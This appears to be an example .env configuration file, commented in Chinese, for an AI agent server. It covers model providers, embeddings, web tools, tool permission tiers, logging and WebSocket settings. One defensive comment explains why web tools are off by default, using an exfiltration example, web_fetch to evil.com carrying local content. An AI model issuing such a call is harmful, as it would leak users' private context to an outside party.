# 默认模型。两种写法都行：
#   PI_MODEL=<provider>/<modelId>          （推荐，一个变量说清）
#   PI_PROVIDER=<provider> + PI_MODEL=<modelId>
# 命令行 --model / --provider 优先级更高。
# 模型 id 本身带斜杠（如 Qwen/Qwen3-...）时，用第一种写法，斜杠会原样保留。
PI_PROVIDER=modelscope
PI_MODEL=deepseek-ai/DeepSeek-V4-Flash-0731

# 模型目录。不填时，setup 只用上面这一条，baseUrl 走 PI_BASE_URL。
# 每条：provider|baseUrl|api|modelId[:显示名],modelId[:显示名]
# 多条用分号隔开。换行请保持在同一行，.env 不支持续行。
# PI_MODELS=modelscope|https://api-inference.modelscope.cn/v1|openai-completions|deepseek-ai/DeepSeek-V4-Flash-0731:DeepSeek-V4-Flash,Qwen/Qwen2.5-72B-Instruct;zhipu|https://open.bigmodel.cn/api/paas/v4|openai-completions|glm-4.5-air:GLM-4.5-Air

# 只在没写 PI_MODELS 时生效
PI_BASE_URL=https://api-inference.modelscope.cn/v1
# PI_API=openai-completions

# 模型轮换列表（官方 scopedModels + cycleModel / WS cycle_model / REST POST /model/cycle / CLI /cycle）。
# 逗号分隔，每项 provider/modelId[:thinkingLevel]。不填则默认用所有已配 Key 的模型派生一份。
# PI_SCOPED_MODELS=modelscope/deepseek-ai/DeepSeek-V4-Flash-0731:high,zhipu/glm-4.5-air:off

# 知识检索后端。默认 keyword（进程内关键词，零依赖，行为与以前一致）。
# 设 vector 则走官方 RAG 入口的可插拔向量检索：启动时把知识库切段→ embedding → cosine。
# PI_KNOWLEDGE_RETRIEVAL=vector
# embedding 源 PI_EMBEDDINGS_PROVIDER：openai（默认）| ollama | transformers（进程内，不需外部服务）
# openai / ollama 需 base+model（Ollama 的 /v1/embeddings 也走 openai 兼容）：
# PI_EMBEDDINGS_PROVIDER=openai
# PI_EMBEDDINGS_BASE_URL=http://127.0.0.1:11434/v1
# PI_EMBEDDINGS_MODEL=bge-m3
# PI_EMBEDDINGS_KEY=
# transformers：首次用自动从 HF Hub 下载 ONNX 权重到 cacheDir、进程内跑（需 npm i @huggingface/transformers）
# PI_EMBEDDINGS_PROVIDER=transformers
# PI_EMBEDDINGS_MODEL=Xenova/bge-small-zh-v1.5
# PI_EMBEDDINGS_CACHE_DIR=C:\Users\you\.cache\pi-embeddings
# 下载主机（默认 huggingface.co；直连不通时可用镜像）：
# PI_EMBEDDINGS_HF_ENDPOINT=hf-mirror.com
# 向量库：memory（默认）| sqlite（重启不重算，持久化到文件）
# PI_KNOWLEDGE_VECTOR_STORE=sqlite
# PI_KNOWLEDGE_VECTOR_DB_PATH=./data/vectors.db

# 密钥由 npm run setup 合并写进 ~/.pi/agent/auth.json（0o600），SDK 运行时从那里读。
# 注意：`loadEnvFile` 会把整份 .env 灌进**服务端自己的 process.env**，所以运行时 PI_API_KEY
# 确实存在于服务进程里（子进程已由 src/child-env.ts 剔除，bash / MCP 读不到）。
# 默认 provider（PI_PROVIDER）用 PI_API_KEY；其余 provider 用 PI_API_KEY_<PROVIDER>（大写）。
# 已有密钥默认保留，覆盖才加 --force。切勿把填好的 .env 提交进 git。
PI_API_KEY=
# PI_API_KEY_ZHIPU=

# 联网工具（web_fetch / web_search）。默认 **关**：出站网络是数据外泄通道
# （web_fetch("https://evil.com/?d=<本地内容>") 一句话就能把上下文发出去），而本服务默认无鉴权。
# 打开后：web_fetch 抓 http/https 网页正文转纯文本；内网 / 回环 / 链路本地地址（含 DNS 解析结果）
# 一律拒绝。web_search 仅在注入的后端实现了 search() 时注册；不注入时用 DuckDuckGo 无 JS 版
# （best-effort HTML 解析，对方改版即抽不到 —— 生产请注入自己的后端，见 lib.ts 的 WebClient）。
# 换后端不改工具契约：buildAgent({ webClient }) 传一个实现即可（换搜索源 / 加缓存 / 加审计）。
# PI_WEB=on
# PI_WEB_MAX_BYTES=262144
# PI_WEB_TIMEOUT_MS=15000

# 内置编码工具档位（命令行 --builtin-tools 优先）
#   off      = 自定义工具 + read（技能走 SDK 原生 read；bash/edit/write 仍关）
#   readonly = 再打开 grep / find / ls
#   coding   = 再打开 bash / edit / write（能改磁盘、能跑 shell）
PI_BUILTIN_TOOLS=off

# 数据库路径。不填 = 内存 SQLite（每次启动都是示例 notes）
# PI_DATABASE_PATH=./data/app.db

# SDK 设置透传（交给官方 SettingsManager，驱动自动压缩/重试/图像/模型白名单）。全部留空则不建 SettingsManager，行为与以往一致。
# 自动压缩：阈值相关 token 预算（reserveTokens 预留、keepRecentTokens 保留最近）、总开关 enabled
# PI_COMPACTION_ENABLED=true
# PI_COMPACTION_RESERVE_TOKENS=8000
# PI_COMPACTION_KEEP_RECENT_TOKENS=4000
# LLM 自动重试：enabled / 最大重试次数 / 基础退避毫秒
# PI_RETRY_ENABLED=true
# PI_RETRY_MAX_RETRIES=3
# PI_RETRY_BASE_DELAY_MS=500
# 图像：autoResize 自动降采、block 屏蔽图片输入
# PI_IMAGES_AUTO_RESIZE=true
# PI_IMAGES_BLOCK=false
# 模型白名单（官方 enabledModels，逗号分隔 provider/modelId）；不设则所有已配 Key 模型可用
# PI_ENABLED_MODELS=openai/gpt-4o,anthropic/claude-sonnet-4-5
# 出站 provider HTTP 空闲超时 / WebSocket 连接超时（毫秒）——区别于入站服务器超时
# PI_HTTP_IDLE_TIMEOUT_MS=300000
# PI_WS_CONNECT_TIMEOUT_MS=30000
# 队列消费策略（all=一次性全部消费 / one-at-a-time=逐条）
# PI_STEERING_MODE=one-at-a-time
# PI_FOLLOW_UP_MODE=one-at-a-time
# 各思考档 token 预算
# PI_THINKING_BUDGET_MINIMAL=1024
# PI_THINKING_BUDGET_LOW=2048
# PI_THINKING_BUDGET_MEDIUM=4096
# PI_THINKING_BUDGET_HIGH=8192
# 分支摘要：预留 token / 是否跳过写提示（true=不弹确认直接摘）
# PI_BRANCH_SUMMARY_RESERVE_TOKENS=2048
# PI_BRANCH_SUMMARY_SKIP=false

# 官方扩展文件路径装载（DefaultResourceLoader.additionalExtensionPaths，逗号分隔 .ts/.js）。
# 与 extraExtensions 内联工厂并列；noExtensions 只关 ~/.pi 扫描，不影响这里。
# PI_EXTENSION_PATHS=./extensions/my-guard.ts,./extensions/audit.ts

# 日志。级别 debug/info/warn/error/silent（默认 info；开发想全开设 debug）。
# PI_LOG_LEVEL=debug
# 是否把结构化日志落盘到文件（默认 true；关则只 stdout）。JSONL 每行一条。
# PI_LOG_TO_FILE=true
# 落盘目录（相对路径按进程 cwd 解析，默认 ./logs；不进版本库/发布包）。
# PI_LOG_DIR=./logs
# 单文件轮转上限 MB（超过即 gzip 归档并重开，默认 50；0 = 不按大小轮转）。
# PI_LOG_MAX_SIZE_MB=50
# 归档保留天数（超期清理 .log 与 .log.gz，默认 14；0 = 不清理）。
# PI_LOG_RETENTION_DAYS=14

# 服务器与 WS 传输。全部有保守默认值，通常不用动。
# 监听地址。默认 127.0.0.1（仅本机）；设成非回环地址会启动告警，而且**没有内置鉴权**——
# 暴露前请自行加反向代理 + 鉴权（见 SECURITY.md）。
# PI_HOST=127.0.0.1
# WebSocket 路径（没写前导斜杠会自动补上）。
# PI_WS_PATH=/ws
# 对外宣告的协议版本。默认取 PROTOCOL_VERSION 单一真源，只在刻意跑版本不匹配的构建时才覆盖。
# PI_PROTOCOL_VERSION=
# 空闲时的快照间隔（毫秒）。默认 60ms：客户端靠 rev 链自愈，丢帧不影响正确性。
# PI_SNAPSHOT_INTERVAL_MS=60
# 流式中的快照间隔（毫秒）。默认 2000ms：流式期间增量帧负责实时性，全量投影刻意放慢。
# PI_STREAMING_SNAPSHOT_INTERVAL_MS=2000
# WS 心跳间隔（毫秒）。
# PI_WS_HEARTBEAT_MS=30000
# 背压丢快照后重建的重试间隔（毫秒）。
# PI_SNAPSHOT_RETRY_MS=500
# 发送缓冲超过该字节数时可丢弃快照（增量帧绕过背压，永远可达）。
# PI_WS_BACKPRESSURE_BYTES=262144
# 连续丢弃多少次快照后判定客户端太慢并断开（0 = 永不断开）。
# PI_WS_MAX_CONSECUTIVE_DROPS=8
